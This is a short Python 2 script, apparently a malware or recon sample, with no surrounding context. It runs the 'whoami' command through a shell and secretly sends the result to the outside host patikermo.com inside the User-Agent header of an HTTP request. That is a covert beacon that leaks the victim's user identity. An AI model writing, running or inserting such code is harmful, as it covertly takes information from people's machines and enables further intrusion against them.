import urllib2
import subprocess
output = subprocess.check_output("whoami", shell=True)
output = output.rstrip()
request = urllib2.Request("http://patikermo.com")
request.add_header('User-Agent',output)
urllib2.urlopen(request)
